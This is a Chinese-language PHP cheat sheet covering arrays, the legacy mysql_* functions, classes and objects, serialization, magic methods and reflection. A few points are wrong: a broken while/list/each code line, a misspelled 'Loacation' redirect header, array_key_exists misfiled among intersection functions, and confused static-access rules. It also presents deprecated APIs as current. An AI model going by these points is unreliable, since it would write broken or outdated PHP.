foreach本身循环结构，break和continue适用于foreach</span><br><span class="line">      2. foreach支持循环的替代语法。</span><br><span class="line">      3. $value是保存元素值的变量，对其修改不会改变数组的元素值</span><br><span class="line">      4. $value支持元素值的引用拷贝，在$value前加上&amp;即可</span><br><span class="line">      5. $key不支持引用传递</span><br><span class="line">      6. foreach遍历的是原数组的拷贝，而在循环体对数组的操作是操作原数组</span><br><span class="line">            即循环体对数组的操作，对原数组生效，对遍历不生效。</span><br><span class="line">            先拷贝一份数组用作遍历</span><br><span class="line"> </span><br><span class="line">while...list...each</span><br><span class="line">while (list($key, $val) = mysql_fetch_row($result)) = each($arr) &#123;</span><br><span class="line">  echo &quot;$key =&gt; $val\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【数组函数】 */</span><br><span class="line">//统计计算</span><br><span class="line">count        计算数组中的单元数目或对象中的属性个数</span><br><span class="line">array_count_values  统计数组中所有的值出现的次数</span><br><span class="line">array_product       计算数组中所有值的乘积</span><br><span class="line">array_sum           计算数组中所有值的和</span><br><span class="line">range        建立一个包含指定范围单元的数组</span><br><span class="line"> </span><br><span class="line">//获取数组内容</span><br><span class="line">array_chunk        将一个数组分割成多个</span><br><span class="line">    array array_chunk(array $input, int $size[, bool $preserve_keys]) </span><br><span class="line">array_filter    用回调函数过滤数组中的单元</span><br><span class="line">array_slice     从数组中取出一段</span><br><span class="line">    array array_slice($arr, $offset [,$len [,$preserve_keys]])</span><br><span class="line">array_keys        返回数组中所有的键名</span><br><span class="line">    array array_keys(array $input[, mixed $search_value[, bool $strict]] )</span><br><span class="line">    如果指定了可选参数 search_value，则只返回该值的键名。否则input数组中的所有键名都会被返回。</span><br><span class="line">array_values    返回数组中所有的值，并建立数字索引</span><br><span class="line"> </span><br><span class="line">array_merge        合并一个或多个数组</span><br><span class="line">    一个数组中的值附加在前一个数组的后面。</span><br><span class="line">    如果输入的数组中有相同的字符串键名，则该键名后面的值将覆盖前一个值。</span><br><span class="line">    如果数组包含数字键名，后面的值将不会覆盖原来的值，而是附加到后面。</span><br><span class="line">    如果只给了一个数组并且该数组是数字索引的，则键名会以连续方式重新索引。 </span><br><span class="line">array_merge_recursive    递归地合并一个或多个数组</span><br><span class="line"> </span><br><span class="line">//搜索</span><br><span class="line">in_array            检查数组中是否存在某个值</span><br><span class="line">    bool in_array(mixed $needle, array $haystack[, bool $strict])</span><br><span class="line">array_key_exists    检查给定的键名或索引是否存在于数组中</span><br><span class="line">    isset()对于数组中为NULL的值不会返回TRUE，而 array_key_exists()会</span><br><span class="line">array_search        在数组中搜索给定的值，如果成功则返回相应的键名</span><br><span class="line"> </span><br><span class="line">array_combine    创建一个数组，用一个数组的值作为其键名，另一个数组的值作为其值</span><br><span class="line">    如果两个数组的单元数不同或者数组为空时返回FALSE。</span><br><span class="line">array_rand        从数组中随机取出一个或多个单元，返回键名或键名组成的数组，下标是自然排序的</span><br><span class="line">array_fill      用给定的值填充数组</span><br><span class="line">    array_fill($start, $num, $value)</span><br><span class="line">array_flip      交换数组中的键和值</span><br><span class="line">array_pad       用值将数组填补到指定长度</span><br><span class="line">array_reverse   返回一个单元顺序相反的数组</span><br><span class="line">array_unique    移除数组中重复的值</span><br><span class="line">array_splice    把数组中的一部分去掉并用其它值取代</span><br><span class="line"> </span><br><span class="line">implode            将数组元素值用某个字符串连接成字符串</span><br><span class="line">explode($delimiter, $str [,$limit])    //使用一个字符串分割另一个字符串</span><br><span class="line">    $delimiter不能为空字符串&quot;&quot;</span><br><span class="line"> </span><br><span class="line">array_map        将回调函数作用到给定数组的单元上，只能处理元素值，可以处理多个数组</span><br><span class="line">    如果callback参数设为null，则合并多个数组为一个多维数组</span><br><span class="line">array_walk        对数组中的每个成员应用用户函数，只能处理一个数组，键和值均可处理，与foreach功能相同</span><br><span class="line">    bool array_walk ( array &amp;$array , callback $funcname [, mixed $userdata ] )</span><br><span class="line"> </span><br><span class="line">//栈：后进先出</span><br><span class="line">入栈和出栈会重新分配索引下标</span><br><span class="line">array_push        将一个或多个单元压入数组的末尾（入栈）</span><br><span class="line">array_pop        将数组最后一个单元弹出（出栈）        使用此函数后会重置(reset())array 指针。</span><br><span class="line"> </span><br><span class="line">//队列：先进先出</span><br><span class="line">队列函数会重新分配索引下标</span><br><span class="line">array_unshift    在数组开头插入一个或多个单元</span><br><span class="line">array_shift        将数组开头的单元移出数组            使用此函数后会重置(reset())array 指针。</span><br><span class="line"> </span><br><span class="line">//排序函数</span><br><span class="line">sort            对数组排序</span><br><span class="line">rsort            对数组逆向排序</span><br><span class="line">asort            对数组进行排序并保持索引关系</span><br><span class="line">arsort            对数组进行逆向排序并保持索引关系</span><br><span class="line">ksort            对数组按照键名排序</span><br><span class="line">krsort            对数组按照键名逆向排序</span><br><span class="line">usort            使用用户自定义的比较函数对数组中的值进行排序</span><br><span class="line">uksort            使用用户自定义的比较函数对数组中的键名进行排序</span><br><span class="line">uasort            使用用户自定义的比较函数对数组中的值进行排序并保持索引关联</span><br><span class="line">natsort            用用“自然排序”算法对数组排序</span><br><span class="line">natcasesort        用“自然排序”算法对数组进行不区分大小写字母的排序</span><br><span class="line">array_multisort 对多个数组或多维数组进行排序</span><br><span class="line">shuffle            将数组打乱</span><br><span class="line">    引用传递参数，返回bool值。</span><br><span class="line">    重新赋予索引键名，删除原有键名</span><br><span class="line"> </span><br><span class="line">//差集</span><br><span class="line">array_udiff_assoc   带索引检查计算数组的差集，用回调函数比较数据</span><br><span class="line">array_udiff_uassoc  带索引检查计算数组的差集，用回调函数比较数据和索引</span><br><span class="line">array_udiff         用回调函数比较数据来计算数组的差集</span><br><span class="line">array_diff_assoc    带索引检查计算数组的差集</span><br><span class="line">array_diff_key      使用键名比较计算数组的差集</span><br><span class="line">array_diff_uassoc   用用户提供的回调函数做索引检查来计算数组的差集</span><br><span class="line">array_diff_ukey     用回调函数对键名比较计算数组的差集</span><br><span class="line">array_diff          计算数组的差集</span><br><span class="line">//交集</span><br><span class="line">array_intersect_assoc 带索引检查计算数组的交集</span><br><span class="line">array_intersect_key 使用键名比较计算数组的交集</span><br><span class="line">array_intersect_uassoc 带索引检查计算数组的交集，用回调函数比较索引</span><br><span class="line">array_intersect_ukey 用回调函数比较键名来计算数组的交集</span><br><span class="line">array_intersect 计算数组的交集</span><br><span class="line">array_key_exists 用回调函数比较键名来计算数组的交集</span><br><span class="line">array_uintersect_assoc 带索引检查计算数组的交集，用回调函数比较数据</span><br><span class="line">array_uintersect 计算数组的交集，用回调函数比较数据</span><br><span class="line"> </span><br><span class="line">extract($arr [,$type [,$prefix]])   从数组中将变量导入到当前的符号表(接受结合数组$arr作为参数并将键名当作变量名，值作为变量的值)</span><br><span class="line">compact($var [,...])   建立一个数组，包括变量名和它们的值(变量名成为键名而变量的内容成为该键的值)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【伪类型】 */</span><br><span class="line">mixed        说明一个参数可以接受多种不同的（但并不必须是所有的）类型。</span><br><span class="line">number        说明一个参数可以是 integer 或者 float。</span><br><span class="line">callback    回调函数</span><br><span class="line">void        void作为返回类型意味着函数的返回值是无用的。</span><br><span class="line">            void作为参数列表意味着函数不接受任何参数。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【数据库操作】 */</span><br><span class="line">#连接认证</span><br><span class="line">mysql_connect        连接并认证数据库</span><br><span class="line">#发送SQL语句，接收执行结果</span><br><span class="line">mysql_query            发送SQL语句</span><br><span class="line">        仅对select, show, explain, describe语句执行成功返回一个资源标识符，其他语句成功返回true。执行失败均返回false。</span><br><span class="line">#处理结果</span><br><span class="line">mysql_fetch_assoc    从结果集中取得一行作为关联数组</span><br><span class="line">        每次只取回一条，类似each</span><br><span class="line">    结果集中记录指针</span><br><span class="line">mysql_fetch_row        从结果集中取得一行作为枚举数组</span><br><span class="line">mysql_fetch_array    从结果集中取得一行作为关联数组，或数字数组，或二者兼有</span><br><span class="line">    array mysql_fetch_array ( resource $result [, int $ result_type  ] )</span><br><span class="line">    可选参数result_type可选值为：MYSQL_ASSOC，MYSQL_NUM 和 MYSQL_BOTH(默认)</span><br><span class="line">mysql_free_result    释放结果内存</span><br><span class="line">#关闭链接</span><br><span class="line">mysql_close            关闭连接</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【类和对象】 */</span><br><span class="line"># 成员：</span><br><span class="line">    类成员：类常量、静态属性、静态方法</span><br><span class="line">    对象成员：非静态属性、非静态方法</span><br><span class="line">    # 除此外，类不能包含任何其他东西！！！</span><br><span class="line"> </span><br><span class="line"># 类名、方法名、属性名均不区分大小写</span><br><span class="line"># $this代表本对象，self代表本类，parent代表父类</span><br><span class="line"># 类和函数均可被事先编译（仅作为最外层时）</span><br><span class="line"># 类的定义必须在单一的PHP区块内，不能被多个PHP标签分割</span><br><span class="line"> </span><br><span class="line">// 构造方法</span><br><span class="line">- 具有构造函数的类会在每次创建新对象时先调用此方法</span><br><span class="line">void __construct([ mixed $args [, $... ]] )</span><br><span class="line">- 构造方法所需参数由new实例化对象时，给类增加参数值。</span><br><span class="line">- 构造方法也可以被手动调用。</span><br><span class="line">- 5.3.3版本以前，支持于类名同名的方法作为构造方法。</span><br><span class="line">- 两种冲突时，__construct 优先</span><br><span class="line"> </span><br><span class="line">// 析构方法</span><br><span class="line">- 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line">void __destruct( void )</span><br><span class="line"># 作用：释放对象所占用的资源</span><br><span class="line"># 调用的时机 </span><br><span class="line">    - 脚本结束时所有资源均被释放，包括对象</span><br><span class="line">    - 手动删除对象时</span><br><span class="line">    - 保存对象的变量被赋予新值时(任何值，包括null)</span><br><span class="line">    - 在使用exit()终止脚本运行时也会被调用</span><br><span class="line"> </span><br><span class="line">// 静态成员(static关键字)</span><br><span class="line">    - 声明类成员或方法为static，就可以不实例化类而直接访问。</span><br><span class="line">    - 静态成员（属性或方法）均属于类，故不能通过$this或-&gt;访问。</span><br><span class="line">    - 静态成员是所有对象共享，属于类。</span><br><span class="line">    - 静态成员用类调用，非静态成员用对象调用。</span><br><span class="line"># 静态属性</span><br><span class="line">    - 静态属性不可以由对象通过-&gt;操作符来访问。</span><br><span class="line">    - 静态属性只能被初始化为一个字符值或一个常量，不能使用表达式。 所以你可以把静态属性初始化为整型或数组，但不能指向另一个变量或函数返回值，也不能指向一个对象。</span><br><span class="line"># 静态方法</span><br><span class="line">    - 由于静态方法不需要通过对象即可调用，所以伪变量$this在静态方法中不可用。</span><br><span class="line">    - 用::方式调用一个非静态方法会导致一个E_STRICT级别的错误。</span><br><span class="line"> </span><br><span class="line">// 访问解析操作符(::)</span><br><span class="line">    - 可以用于访问静态成员、方法和常量，还可以用于覆盖类中的成员和方法。 </span><br><span class="line">    - 当在类的外部访问这些静态成员、方法和常量时，必须使用类的名字。 </span><br><span class="line">    - self 和 parent 这两个特殊的关键字是用于在类的内部对成员或方法进行访问的。</span><br><span class="line"> </span><br><span class="line">// 访问辨析</span><br><span class="line">- 对象成员，内部通过$this指定，外部通过对象名指定，均用-&gt;访问，访问属性时不需加$。</span><br><span class="line">    对象名-&gt;属性名    对象名-&gt;方法名()    $this-&gt;属性名        $this-&gt;方法名()</span><br><span class="line">- 类成员，内部通过self或parent指定，外部通过类名指定，均用::访问，访问属性时需加$。</span><br><span class="line">    类名::$属性名    类名::方法名()        self::$属性名        self::方法名()</span><br><span class="line">- 特殊：也可以通过对象访问类成员。（不建议）</span><br><span class="line">    对象名::$类属性名    $this::$类属性名    对象名::$类方法名()    $this::类方法名()</span><br><span class="line"># 对象成员访问用-&gt;，类成员访问用::</span><br><span class="line"> </span><br><span class="line">- 无论是静态方法还是非静态方法，均可通过类或对象进行访问。</span><br><span class="line">- 静态属性通过类访问，静态方法通过对象访问。</span><br><span class="line">- 只有使用对象调用非静态方法时，$this才可以使用！</span><br><span class="line">- 静态方法不可使用$this。</span><br><span class="line">- 类可以调用对象方法，但注意方法内不能有$this。</span><br><span class="line">- 非静态方法可以调用静态属性或静态方法，反之不可以。</span><br><span class="line"> </span><br><span class="line">// 类常量</span><br><span class="line">- 常量的值将始终保持不变。</span><br><span class="line">- 在定义和使用常量的时候不需要使用$符号。</span><br><span class="line">- 常量的值必须是一个定值，不能是变量，类属性或其它操作（如函数调用）的结果。</span><br><span class="line"># 定义：const 常量名 = 常量值;</span><br><span class="line">- 不需要加public等访问修饰限定符</span><br><span class="line">- 类常量属于类，使用类访问，类名::类常量 或 self::类常量</span><br><span class="line"> </span><br><span class="line">// 自动加载对象</span><br><span class="line">- 在试图使用尚未被定义的类时自动调用 __autoload 函数</span><br><span class="line">- 自动加载使用到的类名文件（根据类名找相应名称的文件，故需类名与类文件名一致）</span><br><span class="line">- 每个需要加载类的文件都需要存在__autoload函数</span><br><span class="line">- 将__autoload函数写入单独的文件，每个需要用到类的文件再require该函数文件</span><br><span class="line">- __autoload 参数是类名</span><br><span class="line">function __autoload($class_name) &#123;</span><br><span class="line">    require_once $_SERVER[&quot;DOCUMENT_ROOT&quot;] . &quot;/class/$class_name.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    // $_SERVER[&quot;DOCUMENT_ROOT&quot;] 当前运行脚本所在的文档根目录</span><br><span class="line">- 可以通过类名，来推导出类所在的文件名！</span><br><span class="line">- 如果一个项目存在多个自动加载函数时，定义一个可以完成加载的普通函数，并在函数之前使用spl_autoload_register注册该函数。</span><br><span class="line"># spl_autoload_register</span><br><span class="line">- 注册__autoload()函数</span><br><span class="line">bool spl_autoload_register ([ callback $autoload_function ] )</span><br><span class="line">- 可以注册多个自动加载函数，先注册的先执行</span><br><span class="line">- 一旦注册自动加载函数，__autoload就失效。</span><br><span class="line">- 注册函数时，参数为函数名（注意加引号）；注册方法时，参数为数组</span><br><span class="line"># 注册类或对象的方法为自动加载方法时，参数需为数组：</span><br><span class="line">spl_autoload_register(array(__CLASS__, &#x27;__autoload&#x27;));</span><br><span class="line">__CLASS__表示当前类名，若是对象可用$this，详细见手册</span><br><span class="line"> </span><br><span class="line">// 序列化（串行化）</span><br><span class="line"># 数据传输均是字符串类型</span><br><span class="line"># 除了资源类型，均可序列化</span><br><span class="line"># 序列化在存放数据时，会存放数据本身，也会存放数据类型</span><br><span class="line">作用：1.在网络传输数据时；2.为了将数组或对象放在磁盘时</span><br><span class="line"># 序列化</span><br><span class="line">serialize        产生一个可存储的值的表示</span><br><span class="line">string serialize ( mixed $value )</span><br><span class="line">- 返回字符串，此字符串包含了表示value的字节流，可以存储于任何地方。</span><br><span class="line">- 有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</span><br><span class="line"># 反序列化</span><br><span class="line">unserialize        从已存储的表示中创建PHP的值</span><br><span class="line">mixed unserialize ( string $str [, string $callback ] )</span><br><span class="line">- 对单一的已序列化的变量进行操作，将其转换回PHP的值。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># 文件的读写操作</span><br><span class="line">- file_put_contents        将一个字符串写入文件</span><br><span class="line">int file_put_contents($file, $data [,$flags])</span><br><span class="line">    $flags：FILE_USE_INCLUDE_PATH(覆盖)，FILE_APPEND(追加)</span><br><span class="line">- file_get_contents        将整个文件读入一个字符串</span><br><span class="line">string file_get_contents($file [, bool $use_include_path [,int $offset [,int $maxlen]]])</span><br><span class="line"> </span><br><span class="line"># 对象序列化</span><br><span class="line">- 只能序列化对象内部的数据，即非静态属性。</span><br><span class="line"># 需在反序列化对象之前加载类，也可以触发自动加载机制。</span><br><span class="line"> </span><br><span class="line">__sleep        序列化需序列化的属性。</span><br><span class="line">        - 提交未提交的数据，或类似的清理操作，部分串行化对象。</span><br><span class="line">        - 返回一个包含对象中所有应被序列化的变量名称的数组</span><br><span class="line">__wakeup    反序列化时，预先准备对象需要的资源</span><br><span class="line">        - 重新建立数据库连接，或执行其它初始化操作</span><br><span class="line">    public function __sleep() &#123;</span><br><span class="line">        return array(&#x27;server&#x27;, &#x27;username&#x27;, &#x27;password&#x27;, &#x27;db&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">// 对象继承</span><br><span class="line">class 子类名 extends 父类 &#123;&#125;</span><br><span class="line">如果一个对象是子类的对象，那么同时也是父类的对象。</span><br><span class="line">单继承：一个类只能继承一个父类，不能同时继承多个类。但一个父类可以被多个子类继承。</span><br><span class="line"> </span><br><span class="line">instanceof    判断某对象是否为某类的对象</span><br><span class="line">    对象名 instanceof 类名</span><br><span class="line"> </span><br><span class="line">// 访问控制</span><br><span class="line">public        公有的（继承链、本类、外部均可访问）</span><br><span class="line">protected    保护的（仅继承链、本类可访问）</span><br><span class="line">private        私有的（仅本类可访问）</span><br><span class="line">根据成员定义位置、访问位置判断。</span><br><span class="line"># 兼容性问题</span><br><span class="line">- 声明属性时，var关键字声明的默认为public权限</span><br><span class="line">- 声明方法时，省略访问修饰符，默认为public权限</span><br><span class="line"> </span><br><span class="line">// 重写 override</span><br><span class="line">$this代表本对象，被谁调用，就代表哪个对象。</span><br><span class="line">- 继承时，子类成员名于父类成员名发生冲突，则子类成员会重写父类成员。</span><br><span class="line">- 属性和方法均可被子类重写。</span><br><span class="line">- 当父类的方法或属性已经不满足子类的需求，则需要重写。</span><br><span class="line">- 也可能因为命名不规范导致重写。</span><br><span class="line"> </span><br><span class="line">私有属性不能被重写，每个私有属性都会被记录。在记录属性名的同时，还会记录类。</span><br><span class="line"> </span><br><span class="line">如果有内置函数被重写，则可调用父类方法。如调用父类构造方法parent::__construct()</span><br><span class="line"> </span><br><span class="line"># 重写限制</span><br><span class="line">访问限制：</span><br><span class="line">    子类的成员的访问控制必须相等或弱于父类。</span><br><span class="line">方法参数限制：</span><br><span class="line">    参数数量必须相同，参数名可不同。</span><br><span class="line"> </span><br><span class="line"># $this确定原则</span><br><span class="line">$this为调用该方法的对象，表示该方法的执行环境对象。</span><br><span class="line">    - 对象调用</span><br><span class="line">    - 环境的传递。如果当前调用时，不能确定$this的值(静态调用)，此时静态调用所处对象环境会传递到被调用的方法内。</span><br><span class="line">$this并非永远代表本对象，而是由方法的执行环境决定。</span><br><span class="line"> </span><br><span class="line"># final</span><br><span class="line">如果父类中的方法被声明为final，则子类无法覆盖（重写）该方法。</span><br><span class="line">如果一个类被声明为final，则不能被继承。</span><br><span class="line">但加有final关键字的类依旧能被实例化！</span><br><span class="line"># 抽象类</span><br><span class="line">关键字：abstract</span><br><span class="line">抽象类不能直接被实例化，必须先继承该抽象类，然后再实例化子类。</span><br><span class="line">抽象类中至少要包含一个抽象方法。非抽象类不能包含抽象方法。</span><br><span class="line">如果类方法被声明为抽象的，那么其中就不能包括具体的功能实现。抽象方法不能包含大括号及方法体。</span><br><span class="line">继承一个抽象类的时候，子类必须实现抽象类中的所有抽象方法。</span><br><span class="line">    即，子类必须重写抽象父类中的所有抽象方法。</span><br><span class="line">另外，这些方法的可见性必须和抽象类中一样（或者更为宽松）。</span><br><span class="line">    即，如果抽象类中某个抽象方法被声明为protected，那么子类中实现的方法就应该声明为protected或者public，而不能定义为private。</span><br><span class="line">- 抽象类的子类中的普通方法执行方式和其他类相同。</span><br><span class="line">- 作用：</span><br><span class="line">    1. 继承，为扩展类，统一公共操作。</span><br><span class="line">    2. 限制结构（规范）。规范子类的结构。</span><br><span class="line"> </span><br><span class="line">// 接口</span><br><span class="line">关键字：interface</span><br><span class="line">- 对象提供的与对象交互的方式就是接口。</span><br><span class="line">- 使用接口可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。</span><br><span class="line">- 通过interface来定义一个接口，就像定义一个标准的类一样，但其中定义所有的方法都是空的。 </span><br><span class="line">- 接口中定义的所有属性和方法都必须是public，可省略public关键字。</span><br><span class="line">- 接口中也可以定义常量(const)。接口常量和类常量的使用完全相同。</span><br><span class="line">    可以用::访问。接口名::常量名，实现类::常量名。</span><br><span class="line">    它们都是定值，可以被子类或子接口使用，但不能修改。</span><br><span class="line">- 接口不能定义属性！</span><br><span class="line"># 定义接口</span><br><span class="line">interface 接口名 &#123;</span><br><span class="line">    接口内容（公共方法声明的集合）</span><br><span class="line">&#125;</span><br><span class="line"># 接口实现</span><br><span class="line">- 要实现一个接口，可以使用implements操作符。</span><br><span class="line">- 类中必须实现接口中定义的所有方法，否则会报一个fatal错误。</span><br><span class="line">- 如果要实现多个接口，可以用逗号来分隔多个接口的名称。</span><br><span class="line">- 实现多个接口时，接口中的方法不能有重名。</span><br><span class="line">- 接口也可以继承，通过使用extends操作符。</span><br><span class="line">class 类名 implements 接口名 &#123;</span><br><span class="line">    接口方法的实现</span><br><span class="line">&#125;</span><br><span class="line"># 注意</span><br><span class="line">    1. 类与抽象类之间是继承关系，类与接口之间是实现关系。</span><br><span class="line">    2. 类与抽象类是单继承，类与接口是多实现。</span><br><span class="line">    3. 接口不是类，限制类的结构。</span><br><span class="line">    4. 接口与接口之间是多继承。用extends关键字。</span><br><span class="line">        interface I_C extends I_A, I_B &#123;&#125;</span><br><span class="line"> </span><br><span class="line">// 静态延迟绑定</span><br><span class="line">self::，代表本类(当前代码所在类)</span><br><span class="line">    永远代表本类，因为在类编译时已经被确定。</span><br><span class="line">    即，子类调用父类方法，self却不代表调用的子类。</span><br><span class="line">static::，代表本类(调用该方法的类)</span><br><span class="line">    用于在继承范围内引用静态调用的类。</span><br><span class="line">    运行时，才确定代表的类。</span><br><span class="line">    static::不再被解析为定义当前方法所在的类，而是在实际运行时计算的。</span><br><span class="line"> </span><br><span class="line">// 对象的遍历（迭代）</span><br><span class="line">- 对象通过属性保存数据，故遍历对象的属性。</span><br><span class="line">- foreach语言结构，获得属性名和属性值。</span><br><span class="line">    foreach ($obj as $p_name =&gt; $p_value) &#123;&#125;</span><br><span class="line"># 自定义遍历(迭代器Iterator)</span><br><span class="line">Iterator - 可在内部迭代自己的外部迭代器或类的接口</span><br><span class="line">Iterator::current    — 返回当前元素</span><br><span class="line">Iterator::key        — 返回当前元素的键</span><br><span class="line">Iterator::next        — 向前移动到下一个元素</span><br><span class="line">Iterator::rewind    — 返回到迭代器的第一个元素</span><br><span class="line">Iterator::valid        — 检查当前位置是否有效</span><br><span class="line"> </span><br><span class="line"># 对象的克隆</span><br><span class="line">//对象之间的传值是[引用]传递。</span><br><span class="line">克隆：新对象 = clone 旧对象</span><br><span class="line">    - 所有的引用属性仍然会是一个指向原来的变量的引用。 </span><br><span class="line">__clone()方法在对象被克隆时自动调用。</span><br><span class="line">注意：构造方法对应实例化(new)，克隆方法对应克隆(clone)。</span><br><span class="line"> </span><br><span class="line">// 单例模式</span><br><span class="line">#三私一公</span><br><span class="line">单例模式（Singleton）用于为一个类生成一个唯一的对象。最常用的地方是数据库连接。使用单例模式生成一个对象后，该对象可以被其它众多对象所使用。</span><br><span class="line"># 防止一个类被实例化多次</span><br><span class="line">class MySQLDB &#123;</span><br><span class="line">    private static $instance = null; // 存类实例在此属性中</span><br><span class="line">    // 构造方法声明为private，防止直接创建对象</span><br><span class="line">    private function __construct() &#123;&#125;</span><br><span class="line">    public static function getInstance() &#123;</span><br><span class="line">        if(! self::$instance instanceof static) &#123;</span><br><span class="line">            self::$instance = new static;</span><br><span class="line">        &#125;</span><br><span class="line">        return self::$instance;</span><br><span class="line">    &#125;</span><br><span class="line">    private function __clone() &#123;&#125; // 阻止用户复制对象实例</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">// 魔术方法</span><br><span class="line">__construct        构造方法</span><br><span class="line">__destruct        析构方法</span><br><span class="line">__clone            克隆对象</span><br><span class="line">__sleep            序列化对象</span><br><span class="line">__wakeup        反序列化对象</span><br><span class="line">__autoload        自动加载，使用类但未找到时</span><br><span class="line"> </span><br><span class="line">__toString        对象被当作字符串使用时</span><br><span class="line">__invoke        当尝试以调用函数的方式调用一个对象时</span><br><span class="line"> </span><br><span class="line"># 重载 overload</span><br><span class="line">指动态地&quot;创建&quot;类属性和方法</span><br><span class="line">用户可以自由的为对象添加额外的属性，该特性就是重载。</span><br><span class="line">所有的重载方法都必须被声明为public。</span><br><span class="line">当调用当前环境下未定义或不可见的类属性或方法时，重载方法会被调用。</span><br><span class="line">重载相关魔术方法的参数都不能通过引用传递。</span><br><span class="line"># 属性重载</span><br><span class="line">- 处理不可访问的属性</span><br><span class="line">属性重载只能在对象中进行。</span><br><span class="line"># 属性重载对于静态属性无效</span><br><span class="line">在静态方法中，这些魔术方法将不会被调用。所以这些方法都不能被声明为static。</span><br><span class="line">__set        在给不可访问的属性赋值时</span><br><span class="line">    public void __set(string $name, mixed $value)</span><br><span class="line">    作用：批量管理私有属性，间接保护对象结构</span><br><span class="line">__get        读取不可访问的属性的值时</span><br><span class="line">    public mixed __get(string $name)</span><br><span class="line">__isset        当对不可访问的属性调用isset()或empty()时</span><br><span class="line">    public bool __isset(string $name)</span><br><span class="line">__unset        当对不可访问的属性调用unset()时</span><br><span class="line">    public void __unset(string $name)</span><br><span class="line"># 方法重载</span><br><span class="line">- 处理不可访问的方法</span><br><span class="line">__call            当调用一个不可访问的非静态方法（如未定义，或者不可见）时自动被调用</span><br><span class="line">        public mixed __call(string $name, array $arguments)</span><br><span class="line">__callStatic    当在调用一个不可访问的静态方法（如未定义，或者不可见）时自动被调用</span><br><span class="line">        public static mixed __callStatic(string $name, array $arguments)</span><br><span class="line"># $name参数是要调用的方法名称。$arguments参数是一个数组，包含着要传递给方法的参数。</span><br><span class="line"> </span><br><span class="line">// 类型约束</span><br><span class="line">函数的参数可以指定只能为对象或数组</span><br><span class="line">限定为对象则在形参前加类名，限定为数组则在形参前加array</span><br><span class="line">类型约束允许NULL值</span><br><span class="line">类型约束不只是用在类的成员方法里，也能使用在函数里。 </span><br><span class="line"> </span><br><span class="line">// 三大特性</span><br><span class="line">封装：隐藏内部是吸纳，仅开发接口。</span><br><span class="line">继承：一个对象的成员被另一个对象所使用。语法上体现为代码的共用。</span><br><span class="line">多态：多种形态。</span><br><span class="line"> </span><br><span class="line">// 类与对象·关键字</span><br><span class="line">this        代表本对象</span><br><span class="line">public        公有的（继承链、本类、外部均可访问）</span><br><span class="line">protected    保护的（仅继承链、本类可访问）</span><br><span class="line">private        私有的（仅本类可访问）</span><br><span class="line">parent::    代表父类</span><br><span class="line">self::        代表本类(当前代码所在类)</span><br><span class="line">static::    代表本类(调用该方法的类)</span><br><span class="line">static        静态成员（属性、方法），所有对象均可使用，外部也可直接使用或修改，静态方法不可访问非静态成员</span><br><span class="line">final        方法用final不可被子类重载，类用final不可被继承（方法、类）</span><br><span class="line">const        类常量（属性）</span><br><span class="line">abstract    抽象类</span><br><span class="line">interface    接口</span><br><span class="line">extends        类继承(子接口继承接口、其他普通类继承)</span><br><span class="line">implements    接口实现（类实现接口、抽象类实现借口）（对接口的实现和继承均可有多个）</span><br><span class="line">Iterator    内置接口（迭代）</span><br><span class="line">clone        克隆</span><br><span class="line">instance    实例</span><br><span class="line">instanceof    某对象是否属于某类</span><br><span class="line">/* 【类与对象相关函数】 */</span><br><span class="line">class_alias([$original [,$alias]])  给类取别名</span><br><span class="line">class_exists($class [,$autoload])   检查类是否已定义</span><br><span class="line">interface_exists($interface [,$autoload])   检查接口是否已被定义</span><br><span class="line">method_exists($obj, $method)检查类的方法是否存在</span><br><span class="line">property_exists($class, $property)  检查对象或类是否具有该属性</span><br><span class="line">get_declared_classes(void)  返回由已定义类的名字所组成的数组</span><br><span class="line">get_declared_interfaces(void)   返回一个数组包含所有已声明的接口</span><br><span class="line">get_class([$obj])       返回对象的类名</span><br><span class="line">get_parent_class([$obj])    返回对象或类的父类名</span><br><span class="line">get_class_methods($class)   返回由类的方法名组成的数组</span><br><span class="line">get_object_vars($obj)   返回由对象属性组成的关联数组</span><br><span class="line">get_class_vars($class)  返回由类的默认属性组成的数组</span><br><span class="line">is_a($obj, $class) 如果对象属于该类或该类是此对象的父类则返回TRUE</span><br><span class="line">is_subclass_of($obj, $class)    如果此对象是该类的子类，则返回TRUE</span><br><span class="line">get_object_vars($obj)   返回由对象属性组成的关联数组</span><br><span class="line">// 常用类</span><br><span class="line"># PHP手册 -&gt; 预定义类</span><br><span class="line">Closure        闭包类，匿名函数对象的final类</span><br><span class="line">stdClass    标准类，通常用于对象类保存集合数据</span><br><span class="line">__PHP_Incomplete_Class        不完整类，当只有对象而没有找到类时，则该对象被认为是该类的对象</span><br><span class="line">Exception    异常类</span><br><span class="line">PDO            数据对象类</span><br><span class="line">// 魔术常量</span><br><span class="line">__DIR__            文件所在的目录</span><br><span class="line">__LINE__        文件中的当前行号 </span><br><span class="line">__FILE__        文件的完整路径（绝对路径）和文件名</span><br><span class="line">__CLASS__        类的名称</span><br><span class="line">__METHOD__        类的方法名，包含类名和方法名</span><br><span class="line">__FUNCTION__    函数名称，用在方法内只表示方法名</span><br><span class="line">// 反射机制 Reflection</span><br><span class="line">作用：1. 获取结构信息        2. 代理执行</span><br><span class="line">ReflectionClass 报告一个类的有关信息</span><br><span class="line">ReflectionMethod 报告一个方法的有关信息</span><br><span class="line">ReflectionClass::export    输出类结构报告</span><br><span class="line"># 代理执行</span><br><span class="line">实例化 ReflectionFunction 类的对象</span><br><span class="line">    $f = new ReflectionFunction(&#x27;func&#x27;);    // func为函数func($p)</span><br><span class="line">    $f-&gt;invoke(&#x27;param&#x27;);</span><br><span class="line">/* 页面跳转 */</span><br><span class="line">// PHP</span><br><span class="line">header(&#x27;Loacation: url&#x27;)</span><br><span class="line">header()执行完毕后，后面的代码也会继续执行，故需在该语句后加die结束</span><br><span 